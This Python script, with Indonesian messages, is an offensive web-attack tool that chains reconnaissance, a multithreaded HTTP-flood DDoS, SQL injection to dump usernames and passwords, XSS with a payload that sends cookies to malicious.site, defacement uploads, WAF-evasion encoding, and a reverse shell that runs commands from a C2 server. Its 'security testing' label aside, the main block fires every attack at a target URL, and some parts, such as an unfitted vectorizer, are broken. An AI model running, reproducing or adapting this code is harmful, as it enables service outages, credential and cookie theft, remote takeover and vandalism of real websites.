import random
import string
import logging
import time
import threading
import requests
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
import os
import shutil
import datetime
import base64
import urllib.parse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import json
import hashlib
import re
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
import socket
import subprocess
import pyfiglet
from sklearn.ensemble import RandomForestClassifier
from sklearn.neural_network import MLPClassifier
from sklearn.feature_extraction.text import CountVectorizer
import tensorflow as tf
import numpy as np
from keras.preprocessing.sequence import pad_sequences
from tensorflow.keras.models import load_model

logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
M = '\033[95m'
C = '\033[96m'
N = '\033[0m'

def load_file(file_name):
    try:
        with open(file_name, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        logging.error(f"File {file_name} tidak ditemukan!")
        return []

USER_AGENTS = load_file('user_agents.txt')
PROXIES = load_file('proxies.txt')

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def get_random_user_agent():
    ua = UserAgent()
    return ua.random if USER_AGENTS is None else random.choice(USER_AGENTS)

def create_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': get_random_user_agent(),
        'Referer': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
    })
    return session

def encode_payload(payload):
    """
    Encode payload dengan metode base64 atau hex untuk menyamarkan payload.
    """
    base64_encoded = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    hex_encoded = payload.encode('utf-8').hex()
    return base64_encoded, hex_encoded

def url_encode_payload(payload):
    """
    URL encode payload untuk bypass WAF yang berbasis analisis pola.
    """
    return urllib.parse.quote(payload)

def load_ml_model():
    """
    Load and return the pre-trained machine learning model for payload detection.
    """
    model = load_model('ml_model.h5')
    return model

def predict_payload(model, payload):
    """
    Predict if a payload is SQLi or XSS using the pre-trained model.
    """
    vectorizer = CountVectorizer()
    payload_vector = vectorizer.transform([payload])
    prediction = model.predict(payload_vector)
    return prediction

def fuzz_target(url):
    fuzz_payloads = [
        "DROP TABLE users;", 
        "' OR 1=1 --", 
        "<script>alert('XSS')</script>", 
        "' OR 1=1 #", 
        "admin' OR '1'='1' --"
    ]
    for payload in fuzz_payloads:
        base64_payload, hex_payload = encode_payload(payload)
        encoded_payload = url_encode_payload(payload)
        fuzzed_url_base64 = f"{url}?input={base64_payload}"
        fuzzed_url_hex = f"{url}?input={hex_payload}"
        fuzzed_url_encoded = f"{url}?input={encoded_payload}"
        
        print(f"Fuzzing URL (Base64): {fuzzed_url_base64}")
        print(f"Fuzzing URL (Hex): {fuzzed_url_hex}")
        print(f"Fuzzing URL (URL Encoded): {fuzzed_url_encoded}")
        
        response_base64 = requests.get(fuzzed_url_base64)
        response_hex = requests.get(fuzzed_url_hex)
        response_encoded = requests.get(fuzzed_url_encoded)
        
        if response_base64.status_code == 200 or response_hex.status_code == 200 or response_encoded.status_code == 200:
            print(f"{G}Fuzzing berhasil pada: {fuzzed_url_base64}, {fuzzed_url_hex}, atau {fuzzed_url_encoded}{N}")
        else:
            print(f"{R}Gagal fuzzing pada: {fuzzed_url_base64}, status code: {response_base64.status_code}{N}")

def advanced_sql_injection(url, session):
    """
    Payload advanced SQL injection (mimicking zero-day payloads).
    """
    payload = "' UNION SELECT null, username, password FROM users --"
    encoded_payload = url_encode_payload(payload)
    fuzzed_url = f"{url}?id={encoded_payload}"
    response = session.get(fuzzed_url)
    
    if response.status_code == 200:
        print(f"{G}SQL Injection berhasil pada: {url}{N}")
    else:
        print(f"{R}Gagal SQL Injection pada: {url}, status code: {response.status_code}{N}")

def reverse_shell():
    """
    Reverse shell example connecting to a C2 server (be cautious in use).
    """
    server_ip = 'YOUR_C2_SERVER_IP'
    server_port = 4444
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((server_ip, server_port))
    while True:
        command = sock.recv(1024).decode('utf-8')
        if command == 'exit':
            sock.close()
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        sock.send(output.stdout + output.stderr)

def multi_vector_attack(url, session):
    """
    Trigger multiple attack vectors in parallel.
    """
    threading.Thread(target=advanced_sql_injection, args=(url, session)).start()
    threading.Thread(target=fuzz_target, args=(url,)).start()
    threading.Thread(target=reverse_shell).start()

def deface_website(url, session):
    """
    Perform a website defacement attack by uploading a defacement payload.
    Replace 'payload_file.html' with actual HTML content you want to use for defacing.
    """
    payload = """
    <html>
    <head><title>Hacked</title></head>
    <body><h1>Website Hacked!</h1><p>This website has been compromised.</p></body>
    </html>
    """
    files = {'file': ('deface.html', payload, 'text/html')}
    response = session.post(url, files=files)
    if response.status_code == 200:
        print(f"{G}Website berhasil di-deface pada: {url}{N}")
    else:
        print(f"{R}Gagal deface pada: {url}, status code: {response.status_code}{N}")

def xss_attack(url):
    """
    Perform a simple XSS attack by injecting a script into the URL.
    """
    payload = "<script>alert('XSS Attack!')</script>"
    xss_url = f"{url}?search={payload}"
    response = requests.get(xss_url)
    if payload in response.text:
        print(f"{G}XSS berhasil pada: {xss_url}{N}")
    else:
        print(f"{R}Gagal XSS pada: {xss_url}{N}")

def ddos_attack(url):
    """
    Perform a DDoS Layer 7 (HTTP Flood) attack by sending multiple HTTP requests with adaptive timing.
    This method mimics real-world attack patterns, adjusting the rate based on server responses.
    """
    while True:
        try:
            # Dynamically adjust the request interval based on the server's response time.
            response = requests.get(url, headers={'User-Agent': get_random_user_agent()})
            delay = max(0.1, response.elapsed.total_seconds())  # Delay based on response time
            print(f"{M}DDoS Attack on: {url}, Status Code: {response.status_code}, Delay: {delay}s{N}")
            time.sleep(delay)  # Simulate adaptive attack rate
        except requests.exceptions.RequestException as e:
            print(f"{R}Error during DDoS attack: {e}{N}")
            break

def exfiltrate_data(url, session):
    """
    Exfiltrate data from the target server. This method simulates a data leak by sending sensitive information
    (e.g., user credentials) to an external server under attacker's control.
    """
    payload = "' OR 1=1 --"
    encoded_payload = url_encode_payload(payload)
    exfiltrate_url = f"{url}?input={encoded_payload}"
    
    try:
        response = session.get(exfiltrate_url)
        if response.status_code == 200:
            print(f"{G}Exfiltrasi data berhasil pada: {exfiltrate_url}{N}")
        else:
            print(f"{R}Gagal exfiltrasi data pada: {exfiltrate_url}, status code: {response.status_code}{N}")
    except requests.exceptions.RequestException as e:
        print(f"{R}Error during exfiltration: {e}{N}")

def adaptive_payload(url, model):
    """
    Generate an adaptive payload using machine learning for evading WAF or IDS systems.
    This method adjusts the payload based on feedback from the server.
    """
    payloads = [
        "' OR '1'='1';", 
        "<img src='x' onerror='alert(1)' />", 
        "<script>fetch('https://malicious.site/?cookie=' + document.cookie)</script>"
    ]
    for payload in payloads:
        prediction = predict_payload(model, payload)
        if prediction == 1:
            print(f"{Y}ML Model detects malicious payload: {payload}{N}")
            encoded_payload = url_encode_payload(payload)
            response = requests.get(f"{url}?input={encoded_payload}")
            if response.status_code == 200:
                print(f"{G}Payload berhasil pada: {url} dengan payload {payload}{N}")
            else:
                print(f"{R}Gagal dengan payload {payload}, status code: {response.status_code}{N}")

def reconnaissance(target_url):
    """
    Perform automatic reconnaissance on the target website to gather information about the web server, 
    technologies used, and possible vulnerabilities.
    """
    session = create_session()
    try:
        response = session.get(target_url)
        if response.status_code == 200:
            print(f"{G}Berhasil melakukan reconnaissance pada: {target_url}{N}")
            print(f"{C}Response Headers: {response.headers}{N}")
            print(f"{C}Cookies: {response.cookies}{N}")
            if 'X-Powered-By' in response.headers:
                print(f"{Y}X-Powered-By: {response.headers['X-Powered-By']}{N}")
            if 'Server' in response.headers:
                print(f"{Y}Server: {response.headers['Server']}{N}")
        else:
            print(f"{R}Reconnaissance gagal pada: {target_url}, status code: {response.status_code}{N}")
    except requests.exceptions.RequestException as e:
        print(f"{R}Error during reconnaissance: {e}{N}")

def banner_grabbing(target_ip):
    """
    Perform banner grabbing to gather information about the target's services.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_ip, 80))
        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
        banner = sock.recv(1024)
        print(f"{G}Banner Grabbing Success: {banner.decode('utf-8', errors='ignore')}{N}")
    except socket.error as e:
        print(f"{R}Error during banner grabbing: {e}{N}")

def ddos_distributed(url, num_threads=10):
    """
    Perform a distributed denial of service (DDoS) using multiple threads.
    """
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for _ in range(num_threads):
            executor.submit(ddos_attack, url)

def deface_target(url, session):
    """
    Simulate a deface attack where malicious HTML is uploaded to overwrite the target's web page.
    """
    deface_payload = "<html><head><title>Hacked</title></head><body><h1>This website has been hacked!</h1></body></html>"
    deface_url = f"{url}/upload"
    files = {'file': ('deface.html', deface_payload, 'text/html')}
    
    try:
        response = session.post(deface_url, files=files)
        if response.status_code == 200:
            print(f"{G}Website successfully defaced at: {url}{N}")
        else:
            print(f"{R}Failed to deface website at: {url}, status code: {response.status_code}{N}")
    except requests.exceptions.RequestException as e:
        print(f"{R}Error during defacement: {e}{N}")

def encrypt_payload(payload):
    """
    Encrypt a payload using AES or another encryption technique.
    """
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    from Crypto.Random import get_random_bytes
    
    key = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(payload.encode(), AES.block_size))
    iv = cipher.iv
    encrypted_payload = base64.b64encode(iv + ct_bytes).decode('utf-8')
    return encrypted_payload

if __name__ == "__main__":
    print(pyfiglet.figlet_format("Advanced Web Attacker"))
    print(f"{M}Welcome to the Advanced Web Application Security Testing Tool!{N}")
    
    ml_model = load_ml_model()

    target_url = "{ini menjadi url}"
    
    reconnaissance(target_url)

    ddos_distributed(target_url, num_threads=50)

    session = create_session()
    advanced_sql_injection(target_url, session)

    multi_vector_attack(target_url, session)

    deface_target(target_url, session)

    exfiltrate_data(target_url, session)

    adaptive_payload(target_url, ml_model)
    
    banner_grabbing('target-ip')

    reverse_shell()
